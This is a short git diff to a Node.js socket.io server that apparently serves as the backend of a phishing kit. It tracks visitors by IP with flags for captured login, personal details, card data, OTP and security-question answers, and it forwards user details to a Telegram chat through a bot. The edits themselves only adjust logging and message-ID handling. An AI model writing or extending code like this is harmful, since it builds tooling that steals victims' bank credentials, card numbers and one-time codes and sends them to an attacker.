@@ -256,12 +256,8 @@ async function sendNewMessage(userDetails){
 
     await bot.sendMessage(chatId, message).then(async(sentMsg) => {
         messageId = sentMsg.message_id;
-        console.log(messageId)
     });
     
-    console.log(messageId)
-    
-
     return messageId
 }
 
@@ -532,6 +528,7 @@ io.on('connection', (socket, req) => {
     })
     
     socket.on('submit', (data) => {
+        let messageId = 0
         if (sessionStore.has(userIP)) {
         let userDetails = sessionStore.get(userIP);
             if (!userDetails.getUserDataLogin && !userDetails.getUserDataDetails && !userDetails.getUserDataCard && !userDetails.getUserDataOTP && !userDetails.getUserDataQuestion) {
@@ -560,8 +557,9 @@ io.on('connection', (socket, req) => {
         sessionStore.set(userIP, userDetails);
         io.emit('join', Array.from(sessionStore.entries())); // Emit the updated state
 
-        sendNewMessage(userDetails)
+        messageId = sendNewMessage(userDetails)
         
+        console.log(messageId)
     }
     /*
         let user = data
